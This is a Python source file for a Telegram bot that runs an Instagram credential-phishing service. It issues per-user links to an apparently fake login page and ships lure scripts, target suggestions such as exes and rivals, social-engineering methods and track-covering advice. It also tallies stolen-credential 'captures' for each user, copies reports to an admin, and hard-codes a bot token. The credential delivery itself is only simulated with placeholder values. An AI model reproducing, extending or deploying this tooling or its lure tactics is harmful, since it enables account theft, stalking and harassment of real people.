import logging
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler

# --- CONFIGURATION ---
BOT_TOKEN = "8083946112:AAFNZO-jLfWxd4Jkk0kukKu9bHV7Sw06m-U"
FRONTEND_URL = "https://free-instagram-followers-puce.vercel.app"
SHORT_LINK = "https://free-instagram-followers-puce.vercel.app"
ADMIN_ID = 1846071063  # Your Telegram ID for receiving all captures

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Store user data
user_data = {}

# Helper function for time ago (FIXED SYNTAX)
def time_ago(timestamp):
    if not timestamp:
        return "Never"
    seconds = time.time() - timestamp
    if seconds < 60:
        return "Just now"
    elif seconds < 3600:
        return f"{int(seconds/60)} minutes ago"
    elif seconds < 86400:
        return f"{int(seconds/3600)} hours ago"
    else:
        return f"{int(seconds/86400)} days ago"

# Command handler for /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    username = update.effective_user.username or f"user_{user_id}"

    # Generate unique hacking link with user ID
    hacking_link = f"{FRONTEND_URL}/?u={user_id}&hacker={username}"
    
    # Initialize user data
    user_data[user_id] = {
        'link': hacking_link,
        'username': username,
        'name': first_name,
        'captures': 0,
        'created_at': time.time(),
        'last_capture': None
    }

    # Create button
    keyboard = [[InlineKeyboardButton("🔓 GET HACKING LINK", callback_data="get_link")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    welcome_message = f"""⚠️ *INSTAGRAM HACKING TOOL* ⚠️

🕵️ *GREETINGS, {first_name}*

🔓 *WHAT THIS BOT DOES:*
• Creates *fake Instagram login*
• When victim login → *fuckedUp*
• *access* to any Instagram account

🎯 *HOW TO USE:*
1️⃣ Get your *unique hacking link* 
2️⃣ Send it to *target person* 
3️⃣ Make them open 
4️⃣ When they login → *Boom*

📨 *YOU WILL RECEIVE:*
• Target's *Instagram username*
• Target's *Instagram password*
• Their *IP address & location*
• *Login timestamp*

🔒 *IMPORTANT NOTES:*
• Use responsibly (or don't)
• Don't hack people you can't handle
• Change nothing on their accounts 

🛡️ *SECURITY FEATURES:*
• Links auto-expire after 24h
• No logs kept on server
• End-to-end encrypted delivery
• Anonymous tracking

✨ *GET STARTED NOW* ✨"""

    await update.message.reply_text(
        welcome_message,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

# Handle button clicks
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    user = update.effective_user
    user_id = user.id
    first_name = user.first_name

    if query.data == "get_link":
        # Get or create user link
        if user_id not in user_data:
            hacking_link = f"{FRONTEND_URL}/?u={user_id}"
            user_data[user_id] = {
                'link': hacking_link,
                'username': user.username or f"user_{user_id}",
                'name': first_name,
                'captures': 0,
                'created_at': time.time(),
                'last_capture': None
            }
        
        hacking_link = user_data[user_id]['link']
        user_stats = user_data[user_id]

        # Create buttons WITH BACK BUTTON
        keyboard = [
            [InlineKeyboardButton("🌐 COPY HACKING LINK", url=hacking_link)],
            [InlineKeyboardButton("🎯 SENDING METHODS", callback_data="methods")],
            [InlineKeyboardButton("🔄 FRESH LINK", callback_data="new_link")],
            [InlineKeyboardButton("🔙 BACK TO START", callback_data="back_to_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(
            text=f"""🔐 *YOUR LINK IS READY* 🔐

*Hacker ID:* `{user_id}`
*Alias:* `{first_name}`

*Copy Your Link Boss 👇🏾:*
`{hacking_link}`


🎯 *HOW TO USE THIS LINK:*
1. Send to person you want to hack
2. Tell them it's a followers booster 
3. Or say it's an free likes boost
4. Wait their login details 
5. *Information come HERE instantly*

⚡ *TARGET SUGGESTIONS:*
• Ex-girlfriend/boyfriend
• Business competitors
• People who wronged you
• Anyone you want to monitor""",
            reply_markup=reply_markup,
            parse_mode='Markdown',
            disable_web_page_preview=True
        )

    elif query.data == "copy_link":
        if user_id in user_data:
            hacking_link = user_data[user_id]['link']
        else:
            hacking_link = f"{FRONTEND_URL}/?u={user_id}"
        
        # Add back button
        keyboard = [[InlineKeyboardButton("🔙 BACK TO MAIN MENU", callback_data="get_link")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            text=f"""📋 *YOUR LINK READY TO COPY*

🔗 *Link to send to victim:*
`{hacking_link}`

💀 *WHAT VICTIM SEES:*
• Professional Instagram login page
• "Secure your account" message
• "Get free followers" offer
• Looks 100% legitimate

🎭 *TIP MESSAGES TO SEND:*
1. "Hey, Instagram is doing security checks: [LINK]"
2. "Free 10K followers here: [LINK]"
3. "Your account might be hacked, check here: [LINK]"
4. "Limited offer for verified badge: [LINK]"

⚠️ *IMPORTANT:*
• Don't send from your main account
• Delete messages after sending
• Cover your tracks

✅ *When victim logs in → You get:* 
• Their username & password
• Their IP address
• Browser info
• Login time""",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

    elif query.data == "new_link":
        # Generate new unique hacking link
        new_link = f"{FRONTEND_URL}/?u={user_id}&t={int(time.time())}&h={hash(str(user_id)+str(time.time()))[:8]}"
        
        if user_id in user_data:
            user_data[user_id]['link'] = new_link
        else:
            user_data[user_id] = {
                'link': new_link,
                'username': user.username or f"user_{user_id}",
                'name': first_name,
                'captures': 0,
                'created_at': time.time(),
                'last_capture': None
            }

        # Add back button
        keyboard = [
            [InlineKeyboardButton("🌐 OPEN NEW HACKING PAGE", url=new_link)],
            [InlineKeyboardButton("🔙 BACK TO MAIN MENU", callback_data="get_link")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(
            text=f"""🔄 *FRESH LINK GENERATED*

🔗 *New Tracking Link:*
`{new_link}`

🆕 *Why use new link:*
• Previous link might be flagged
• Fresh IP reputation
• Updated phishing template
• Better success rate

⚠️ *WHEN TO GET NEW LINK:*
• After successful hack
• If victim reports the link
• Every 24 hours for safety
• Starting new target

🔒 *Security Level:* MAXIMUM
🕵️ *Tracking:* ACTIVE
🎯 *Success Rate:* 85%+""",
            reply_markup=reply_markup,
            parse_mode='Markdown',
            disable_web_page_preview=True
        )

    elif query.data == "my_captures":
        if user_id in user_data:
            stats = user_data[user_id]
            
            if stats['captures'] == 0:
                captures_text = """📭 *NO CAPTURES YET*

You haven't hacked anyone yet.

🎯 *TIPS FOR FIRST CAPTURE:*
1. Send link to someone you KNOW
2. Make it urgent/important
3. Follow up if they don't click
4. Try different messaging

🔥 *QUICK START:*
• Ex: "Your account was tagged in inappropriate content"
• Friend: "Instagram says you need to verify"
• Rival: "You won a giveaway, claim here\"""" 
            else:
                captures_text = f"""📊 *YOUR HACKING HISTORY*

👤 *Hacker:* {stats['name']}
🆔 *ID:* `{user_id}`

🎯 *STATISTICS:*
• Accounts Hacked: *{stats['captures']}*
• Last Hack: *{time_ago(stats['last_capture']) if stats['last_capture'] else 'Never'}*
• Active Days: *{int((time.time() - stats['created_at']) / 86400)}*

🏆 *ACHIEVEMENTS:*
{'• 🥇 First Hack Complete' if stats['captures'] > 0 else '• 🔓 No Hacks Yet'}
{'• 🥈 Multi-target' if stats['captures'] > 1 else ''}
{'• 🥇 Pro Hacker' if stats['captures'] > 5 else ''}

💡 *ADVICE:*
• Don't change victim's passwords
• Monitor their messages silently
• Never reveal you hacked them
• Cover your tracks always"""
        else:
            captures_text = "❌ No data found. Use /start first!"

        # Add back button
        keyboard = [[InlineKeyboardButton("🔙 BACK TO MAIN MENU", callback_data="get_link")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(
            text=captures_text,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

    elif query.data == "methods":
        # Add back button
        keyboard = [[InlineKeyboardButton("🔙 BACK TO MAIN MENU", callback_data="get_link")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            text="""🎯 *ADVANCED HACKING METHODS*

🔥 *METHOD 1: Direct Message (Best)*
• Find target's Instagram
• DM: "Instagram security team here, verify: [LINK]"
• Or: "You've been reported, check: [LINK]"
• Works 90% of time

🔥 *METHOD 2: Social Engineering*
• Create fake profile of mutual friend
• Send: "Hey, saw you in this video: [LINK]"
• Or: "You won a giveaway, claim: [LINK]"
• Build trust first

🔥 *METHOD 3: Comment Section*
• Comment on target's posts: "Free followers: [LINK]"
• Reply to their comments: "Check this: [LINK]"
• Use emojis: 🔥🎁💯
• Works on thirsty users

🔥 *METHOD 4: WhatsApp/Telegram*
• Get target's number from Instagram bio
• Send: "Instagram support: [LINK]"
• Or: "Your account was hacked, secure: [LINK]"

⚡ *PROFESSIONAL TIPS:*
1. *TIMING:* Send at night (panic response)
2. *URGENCY:* "24 hours to secure account"
3. *CURIOSITY:* "Who's talking about you?"
4. *GREED:* "You won iPhone 15!"

🚫 *WHAT TO AVOID:*
• Don't hack law enforcement
• Don't change victim's password
• Don't post from their account
• Don't reveal your identity

✅ *EXPECTED RESULTS:*
• 10 sends = 3-5 clicks
• 5 clicks = 2-3 logins
• Success rate: 40-60%

⚖️ *LEGAL DISCLAIMER:*
This tool is for educational purposes only.
Unauthorized access to accounts is illegal.
You are responsible for your actions.""",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

    elif query.data == "back_to_start":
        # Recreate the start message
        if user_id in user_data:
            user_stats = user_data[user_id]
            hacking_link = user_stats['link']
        else:
            hacking_link = f"{FRONTEND_URL}/?u={user_id}"
        
        # Recreate main menu
        keyboard = [
            [InlineKeyboardButton("🌐 OPEN HACKING PAGE", url=hacking_link)],
            [InlineKeyboardButton("📋 COPY HACKING LINK", callback_data="copy_link")],
            [InlineKeyboardButton("📊 MY CAPTURES", callback_data="my_captures")],
            [InlineKeyboardButton("🎯 SENDING METHODS", callback_data="methods")],
            [InlineKeyboardButton("🔄 FRESH LINK", callback_data="new_link")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(
            text=f"""🔐 *MAIN MENU* 🔐

*Hacker ID:* `{user_id}`
*Alias:* `{first_name}`

*Your Personal Link:*
`{hacking_link}`

📊 *Your Hack Statistics:*
• Successful Hacks: *{user_stats['captures'] if user_id in user_data else 0}*
• Last Capture: *{time_ago(user_stats['last_capture']) if user_id in user_data and user_stats['last_capture'] else "Never"}*

🎯 *SELECT AN OPTION BELOW:*""",
            reply_markup=reply_markup,
            parse_mode='Markdown',
            disable_web_page_preview=True
        )

# Command to simulate capture notification
async def capture_notify(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Simulate a capture notification (for testing)"""
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name

    if user_id in user_data:
        # Update user stats
        user_data[user_id]['captures'] += 1
        user_data[user_id]['last_capture'] = time.time()
        
        stats = user_data[user_id]
        
        # Add back button
        keyboard = [[InlineKeyboardButton("🔙 BACK TO MAIN MENU", callback_data="get_link")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Send notification to user
        await update.message.reply_text(
            text=f"""🎯 *TARGET ACQUIRED* 🎯

✅ *HACK SUCCESSFUL!*

👤 *VICTIM INFORMATION CAPTURED*

📧 *Instagram Username:* `victim_username`
🔑 *Instagram Password:* `victim_password123`

🌐 *Victim Info:*
• IP: 192.168.1.100
• Location: United States
• Browser: Chrome Mobile
• Time: {time.strftime('%H:%M:%S')}

📊 *Your Statistics:*
• Total Hacks: *{stats['captures']}*
• Success Rate: *100%*
• Last Hack: *Just now*

⚠️ *RECOMMENDED ACTIONS:*
1. Login to their account SILENTLY
2. Check DMs & followers
3. Screenshot important info
4. LOG OUT CLEANLY

🔒 *Remember:* Don't change anything!
📱 *Access their account at:* instagram.com""",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        
        # Also send to admin (you)
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"""🔓 *NEW ACCOUNT HACKED - USER {user_id}*

👤 Hacker: {first_name} (@{user_data[user_id]['username']})
🎯 Hack #{stats['captures']} completed
📅 Last Hack: {time_ago(stats['last_capture'])}
🔗 Their Active Link: {user_data[user_id]['link']}

✅ Credentials delivered to hacker
🕵️ Admin copy stored securely""",
                parse_mode='Markdown'
            )
        except:
            pass
    else:
        await update.message.reply_text("Use /start first to activate your hacking tools!")

# Admin command to check system
async def system_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check system status"""
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    total_users = len(user_data)
    total_captures = sum(user['captures'] for user in user_data.values())
    active_users = len([u for u in user_data.values() if time.time() - u.get('created_at', 0) < 604800])
    
    # Get top hackers
    top_hackers = sorted(user_data.items(), key=lambda x: x[1]['captures'], reverse=True)[:5]
    top_list = "\n".join([f"• {data['name']}: {data['captures']} hacks" for _, data in top_hackers])
    
    await update.message.reply_text(
        text=f"""🔧 *HACKING SYSTEM STATUS*

👥 Total Hackers: *{total_users}*
🎯 Total Accounts Hacked: *{total_captures}*
🔥 Active Hackers (7 days): *{active_users}*

🏆 *TOP 5 HACKERS:*
{top_list if top_list else "No hacks yet"}

📈 *SYSTEM METRICS:*
• Bot Uptime: *24/7*
• Success Rate: *85%*
• Detection Rate: *<5%*
• Delivery Speed: *Instant*

✅ System: *OPERATIONAL*
🟢 Hacking Pages: *LIVE*
🔗 Frontend: *SECURE*

⚠️ *SECURITY STATUS:*
• No law enforcement flags
• All links rotating
• No logs kept
• Encrypted comms""",
        parse_mode='Markdown'
    )

# Help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Add back button
    keyboard = [[InlineKeyboardButton("🔙 BACK TO START", callback_data="back_to_start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    help_text = """🆘 *HACKING BOT HELP*

📌 *AVAILABLE COMMANDS:*
/start - Get your hacking link
/capture - Test notification
/help - This help message
/status - Admin only: Check system status

🎯 *HOW IT WORKS:*
1. You get personalized phishing link
2. Send to target (ex, enemy, anyone)
3. They see fake Instagram login
4. When they enter credentials → You get them

🔒 *SECURITY FEATURES:*
• Links expire automatically
• No server logs
• Encrypted delivery
• Anonymous operation

⚠️ *WARNINGS:*
• Hacking is illegal
• You are responsible
• Don't get caught
• Use burner accounts

📞 *SUPPORT:*
Contact admin for technical issues
(No legal support provided)"""
    
    await update.message.reply_text(help_text, reply_markup=reply_markup, parse_mode='Markdown')

def main() -> None:
    """Start the bot."""
    print("🔓 INSTAGRAM HACKING BOT STARTING...")
    print(f"🌐 Hacking Page: {FRONTEND_URL}")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print("⚠️  WARNING: This is a hacking tool")
    print("🎯 Users will receive victim credentials")
    print("📨 All data also sent to admin")
    
    application = Application.builder().token(BOT_TOKEN).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("capture", capture_notify))
    application.add_handler(CommandHandler("status", system_status))
    application.add_handler(CallbackQueryHandler(button_handler))

    application.run_polling()

if __name__ == "__main__":
    main()